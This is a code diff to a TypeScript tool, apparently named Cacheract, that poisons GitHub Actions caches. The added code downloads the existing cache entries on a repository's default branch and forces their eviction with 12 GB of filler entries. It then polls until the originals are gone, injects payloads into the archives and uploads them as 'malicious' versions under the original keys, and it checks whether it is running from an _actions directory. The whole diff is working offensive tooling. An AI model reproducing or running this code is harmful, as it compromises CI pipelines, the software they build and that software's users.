@@ -84,17 +84,10 @@ export class App {
 
         // 5. Fill Cache (if configured)
         if (!this.isInfected() && Config.cache.fillCount > 0) {
-            for (let i = 0; i < Config.cache.fillCount; i++) {
-                const counter = i.toString().padStart(2, '0');
-                const key = `setup-python-Linux-24.04.1-Ubuntu-python-${counter}`;
-                const version = crypto.randomBytes(32).toString('hex');
-                await this.createAndSetEntry(1000000000, key, version, accessToken, false);
-            }
+            await this.fillCacheWithDummyData(Config.cache.fillCount, accessToken);
         }
 
         // 6. Wait for key rollover
-        // Replaced hard sleep with a log message for now, but keeping the sleep as per original logic
-        // Ideally we would poll here.
         console.log(`Waiting ${Config.timeouts.keyRollover}ms for cache key propagation...`);
         await sleep(Config.timeouts.keyRollover);
 
@@ -109,6 +102,15 @@ export class App {
 
     private isInfected(): boolean {
         return __dirname.includes('_actions');
+    }
+
+    private async fillCacheWithDummyData(count: number, accessToken: string) {
+        console.log(`Adding ${count} GB of filler entries...`);
+        for (let i = 0; i < count; i++) {
+            const key = `setup-python-Linux-24.04.1-Ubuntu-python`;
+            const version = crypto.randomBytes(32).toString('hex');
+            await this.createAndSetEntry(1000000000, key, version, accessToken, false);
+        }
     }
 
     private async createAndSetEntry(size: number, key: string, version: string, accessToken: string, injectPayload: boolean = true) {
@@ -156,8 +158,6 @@ export class App {
                 ];
 
                 if (Config.github.ref) {
-                    // Check if entry exists in main (using current ref as proxy if we are in main? No, checkCacheEntry uses ref)
-                    // Original code: checkCacheEntry(githubToken, key, process.env.GITHUB_REF)
                     if (!await this.githubService.checkCacheEntry(githubToken, key, Config.github.ref)) {
                         entriesToUpdate.push({
                             key,
@@ -170,12 +170,6 @@ export class App {
                     console.error('GITHUB_REF is not defined');
                 }
             }
-
-            // Merge calculated entries with existing entries?
-            // Original code: `entries` is the list from listCacheEntries.
-            // Then it iterates `configs`. If config not in cache (checkCacheEntry returns false), it pushes to `entries`.
-            // So `entries` contains both existing caches AND new ones we want to create.
-            // Wait, `entries` is `CacheEntry[]`. `entriesToUpdate` items are pushed to it.
 
             const allEntries = [...entries, ...entriesToUpdate];
 
@@ -268,44 +262,115 @@ export class App {
         console.log(`Targeting default branch: ${defaultBranch} (${defaultRef})`);
 
         const allCaches = await this.githubService.listCacheEntries(githubToken);
-        const targetCaches = allCaches.filter(c => c.ref === defaultRef);
+
+        // Filter valid targets on default branch, excluding our own filler key
+        const targetCaches = allCaches.filter(c =>
+            c.ref === defaultRef &&
+            !c.key.includes('setup-python-Linux-24.04.1-Ubuntu-python')
+        );
+
         console.log(`Found ${targetCaches.length} existing cache entries on ${defaultBranch}.`);
 
+        // Map key:version to entry details to handle deduplication
+        const targetsMap = new Map<string, { key: string, version: string, size: number, exists: boolean }>();
+
+        // Add existing caches
+        for (const c of targetCaches) {
+            targetsMap.set(`${c.key}::${c.version}`, { key: c.key, version: c.version, size: c.size, exists: true });
+        }
+
+        // Add explicit entries
+        for (const e of Config.cache.explicitEntries) {
+            const compositeKey = `${e.key}::${e.version}`;
+            if (!targetsMap.has(compositeKey)) {
+                targetsMap.set(compositeKey, { key: e.key, version: e.version, size: 100000000, exists: false });
+            }
+        }
+
+        // Preparation: Download existing entries before they are evicted
+        const entriesToRestore: { key: string, version: string, path: string, size: number }[] = [];
+        console.log(`Preparing to restore ${targetsMap.size} entries after eviction.`);
+
+        const currentFilePath = process.argv[1];
+        let downloadedCount = 0;
+        const MAX_DOWNLOAD_SIZE = 250 * 1024 * 1024; // 250MB
+        const MAX_DOWNLOAD_COUNT = 10;
+
+        for (const target of targetsMap.values()) {
+            if (target.exists) {
+                if (target.size < MAX_DOWNLOAD_SIZE && downloadedCount < MAX_DOWNLOAD_COUNT) {
+                    console.log(`Downloading existing entry ${target.key} (v: ${target.version}) before eviction...`);
+                    const path = await this.cacheService.retrieveEntry(target.key, target.version, accessToken);
+                    if (path) {
+                        entriesToRestore.push({ key: target.key, version: target.version, path, size: target.size });
+                        downloadedCount++;
+                    } else {
+                        console.warn(`Failed to retrieve ${target.key}. Will replace with fresh payload instead.`);
+                        entriesToRestore.push({ key: target.key, version: target.version, path: '', size: target.size });
+                    }
+                } else {
+                    const reason = target.size >= MAX_DOWNLOAD_SIZE ? 'size limit' : 'count limit';
+                    console.log(`Skipping download for ${target.key} (Size: ${target.size}) due to ${reason}. Will replace with fresh payload.`);
+                    entriesToRestore.push({ key: target.key, version: target.version, path: '', size: target.size });
+                }
+            } else {
+                console.log(`Marking new explicit entry ${target.key} for creation after eviction.`);
+                entriesToRestore.push({ key: target.key, version: target.version, path: '', size: target.size });
+            }
+        }
+
+        // Trigger Eviction
+        await this.fillCacheWithDummyData(12, accessToken);
+
+        // Calculate initial keys to watch for eviction (only those that actually existed)
         const initialEntries = new Set(targetCaches.map(c => `${c.key}::${c.version}`));
 
-        console.log("Adding 12 GB of filler entries...");
-        for (let i = 0; i < 12; i++) {
-            const counter = i.toString().padStart(2, '0');
-            const key = `setup-python-Linux-24.04.1-Ubuntu-python-${counter}`;
-            const version = "58627df9f4feac69570413c79e73cb53e7095372eaab31064b36520a602db61b";
-            await this.createAndSetEntry(1000000000, key, version, accessToken, false);
-        }
+        if (initialEntries.size > 0) {
+            console.log("Polling for eviction of original keys...");
+            const startTime = Date.now();
+            const maxTime = 2 * 60 * 1000; // 2 minutes
 
-        if (initialEntries.size === 0) {
-            console.log("No initial entries to wait for eviction.");
-            return;
-        }
+            while (Date.now() - startTime < maxTime) {
+                await sleep(5000);
+                const currentCaches = await this.githubService.listCacheEntries(githubToken);
+                let remaining = 0;
+                for (const c of currentCaches) {
+                    if (c.ref === defaultRef && initialEntries.has(`${c.key}::${c.version}`)) {
+                        remaining++;
+                    }
+                }
 
-        console.log("Polling for eviction of original keys...");
-        const startTime = Date.now();
-        const maxTime = 2 * 60 * 1000; // 2 minutes
-
-        while (Date.now() - startTime < maxTime) {
-            await sleep(5000);
-
-            const currentCaches = await this.githubService.listCacheEntries(githubToken);
-            let remaining = 0;
-            for (const c of currentCaches) {
-                if (c.ref === defaultRef && initialEntries.has(`${c.key}::${c.version}`)) {
-                    remaining++;
+                if (remaining === 0) {
+                    console.log("All original cache keys have been evicted!");
+                    break;
                 }
             }
+        } else {
+            console.log("No initial entries to wait for eviction.");
+        }
 
-            if (remaining === 0) {
-                console.log("All original cache keys have been evicted!");
-                return;
+        // Resurrect / Create Entries
+        console.log("Resurrecting entries with Cacheract payload...");
+        for (const entry of entriesToRestore) {
+            let archivePath = entry.path;
+
+            // If it's a new explicit entry, create a random archive
+            if (!archivePath) {
+                archivePath = await this.archiveService.createRandomArchive(entry.size);
+            }
+
+            if (archivePath) {
+                // Determine status (inject payload)
+                const status = await this.archiveService.injectPayloads(archivePath, currentFilePath);
+                if (status) {
+                    console.log(`Uploading malicious version of ${entry.key}...`);
+                    await this.cacheService.setEntry(archivePath, entry.key, entry.version, accessToken);
+                } else {
+                    console.error(`Failed to inject payload into ${entry.key}`);
+                }
+
+                cleanupFile(archivePath, 'archive after upload');
             }
         }
-        console.log("Timeout reached waiting for cache eviction.");
     }
 }
